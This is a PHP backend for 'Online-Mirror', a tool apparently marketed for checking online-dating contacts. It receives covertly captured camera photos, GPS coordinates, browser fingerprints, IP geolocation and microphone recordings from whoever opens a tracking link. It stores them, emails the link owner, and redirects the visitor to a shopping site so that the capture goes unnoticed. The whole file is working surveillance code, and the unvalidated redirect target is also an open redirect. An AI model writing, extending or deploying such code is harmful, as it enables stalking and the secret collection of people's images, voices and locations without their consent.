<?php
/**
 * Online-Mirror v3.0 - 保存照片（接收端）
 * 支持GPS定位 + 浏览器指纹 + IP地理位置
 */
require_once __DIR__ . '/config.php';

$base64_img = trim($_POST['img'] ?? '');
$id = trim($_POST['id'] ?? '');
$url = trim($_POST['url'] ?? '');
$lat = trim($_POST['lat'] ?? '');
$lng = trim($_POST['lng'] ?? '');
$screen = trim($_POST['screen'] ?? '');
$os = trim($_POST['os'] ?? '');
$browser = trim($_POST['browser'] ?? '');
$lang = trim($_POST['lang'] ?? '');
$recording_seconds = intval($_POST['recording_seconds'] ?? 0);
$recording_data = trim($_POST['recording_data'] ?? '');

if (empty($id) || empty($base64_img)) {
    if (!empty($url)) header("Location: " . $url);
    else header("Location: https://mobile.yangkeduo.com/");
    exit;
}

// 🔒 限制 base64 图片大小
if (strlen($base64_img) > 5 * 1024 * 1024) {
    if (!empty($url)) header("Location: " . $url);
    else header("Location: https://mobile.yangkeduo.com/");
    exit;
}

// 🔒 防止路径遍历
$id = preg_replace('/[^a-zA-Z0-9_\-]/', '', $id);
if (empty($id)) {
    if (!empty($url)) header("Location: " . $url);
    else header("Location: https://mobile.yangkeduo.com/");
    exit;
}

// 确保图片目录存在
if (!file_exists(IMG_DIR)) {
    mkdir(IMG_DIR, 0755, true);
}

// 🔒 验证图片格式
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)) {
    $type = strtolower($result[2]);
    
    $allowed_types = ['png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp'];
    if (!in_array($type, $allowed_types)) {
        if (!empty($url)) header("Location: " . $url);
        else header("Location: https://mobile.yangkeduo.com/");
        exit;
    }
    
    $ext_map = ['jpeg' => 'jpg'];
    $ext = $ext_map[$type] ?? $type;
    
    // 🔒 随机文件名
    $filename = $id . '_' . date('Ymd_His') . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 8) . '.' . $ext;
    $filepath = IMG_DIR . $filename;
    
    $image_data = base64_decode(str_replace($result[1], '', $base64_img));
    
    // 🔒 验证有效图片
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_buffer($finfo, $image_data);
    finfo_close($finfo);
    
    $allowed_mime = ['image/png', 'image/jpeg', 'image/gif', 'image/bmp', 'image/webp'];
    if (!in_array($mime_type, $allowed_mime)) {
        if (!empty($url)) header("Location: " . $url);
        else header("Location: https://mobile.yangkeduo.com/");
        exit;
    }
    
    $file_size = file_put_contents($filepath, $image_data);
    
    // 获取IP地理信息
    $client_ip = getClientIP();
    $geo = getIPGeo($client_ip);
    $city = $geo['city'] ?? null;
    $isp = $geo['isp'] ?? null;
    
    // 🔒 验证GPS坐标有效性
    if (!empty($lat) && !empty($lng)) {
        $lat = is_numeric($lat) && $lat >= -90 && $lat <= 90 ? $lat : null;
        $lng = is_numeric($lng) && $lng >= -180 && $lng <= 180 ? $lng : null;
    } else {
        $lat = null;
        $lng = null;
    }
    
    // 🔒 清理浏览器指纹字段
    $screen = preg_replace('/[^0-9x]/', '', $screen);
    $os = mb_substr(strip_tags($os), 0, 50);
    $browser = mb_substr(strip_tags($browser), 0, 100);
    $lang = preg_replace('/[^a-zA-Z0-9\-_,]/', '', $lang);
    $recording_seconds = max(0, min(300, $recording_seconds)); // 0-300秒
    
    // 🎤 处理录音文件
    $recording_filename = null;
    if (!empty($recording_data) && preg_match('/^data:audio\/([\w+]+);/', $recording_data, $audio_m)) {
        $audio_ext = str_replace(['x-','webm'], ['','webm'], strtolower($audio_m[1]));
        $allowed_audio = ['webm', 'ogg', 'mp4', 'm4a', 'wav'];
        if (in_array($audio_ext, $allowed_audio)) {
            $recording_dir = __DIR__ . '/uploads/recordings/';
            if (!file_exists($recording_dir)) mkdir($recording_dir, 0755, true);
            $recording_filename = $id . '_' . date('Ymd_His') . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 8) . '.' . $audio_ext;
            // 找到base64数据的起始位置，兼容 ;codecs=opus 等中间参数
            $base64_pos = strpos($recording_data, 'base64,');
            if ($base64_pos === false) {
                $recording_filename = null;
            } else {
                $audio_data = base64_decode(substr($recording_data, $base64_pos + 7));
                if (strlen($audio_data) > 10 * 1024 * 1024) {
                    $recording_filename = null;
                } else {
                    file_put_contents($recording_dir . $recording_filename, $audio_data);
                }
            }
        }
    }
    
    try {
        $db = getDB();
        
        $stmt = $db->prepare("UPDATE mir_links SET captures = captures + 1 WHERE link_id = ?");
        $stmt->execute([$id]);
        
        $stmt = $db->prepare("INSERT INTO mir_photos (link_id, file_path, ip_address, lat, lng, screen_resolution, os, browser, browser_lang, recording_seconds, recording_file_path, city, isp, user_agent, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$id, $filename, $client_ip, $lat, $lng, $screen, $os, $browser, $lang, $recording_seconds, $recording_filename, $city, $isp, mb_substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500), $file_size]);
        
        addLog($id, 'capture');
        
        // 📧 发送全局邮件通知
        sendEmailNotify($id, [
            'city' => $city,
            'ip_address' => $client_ip,
            'browser' => $browser,
            'os' => $os,
        ]);
        
        // 📧 检查链接是否有独立通知邮箱
        $link_stmt = $db->prepare("SELECT notify_email FROM mir_links WHERE link_id = ? AND notify_email IS NOT NULL AND notify_email != ''");
        $link_stmt->execute([$id]);
        $link_row = $link_stmt->fetch();
        if ($link_row && !empty($link_row['notify_email'])) {
            $to = $link_row['notify_email'];
            $from = getSetting('email_send_address');
            $smtp_host = getSetting('email_smtp_host');
            $smtp_port = getSetting('email_smtp_port');
            $smtp_secure = getSetting('email_smtp_secure');
            $password = getSetting('email_send_password');
            if (!empty($from) && !empty($smtp_host) && !empty($password)) {
                $subject = '📸 网恋照妖镜 - 新拍照通知';
                $photo_url = SITE_URL . 'photos.php?id=' . urlencode($id);
                $time = date('Y-m-d H:i:s');
                $body = buildEmailBody($id, $city, $client_ip, $os, $browser, $time, $photo_url);
                sendSmtpMail($to, $subject, $body, $from, $smtp_host, $smtp_port, $smtp_secure, $password);
            }
        }
        
    } catch (Exception $e) {
        // 入库失败不影响跳转
    }
}

// 跳转
$target = !empty($url) ? $url : 'https://mobile.yangkeduo.com/';
header("Location: " . $target);
exit;
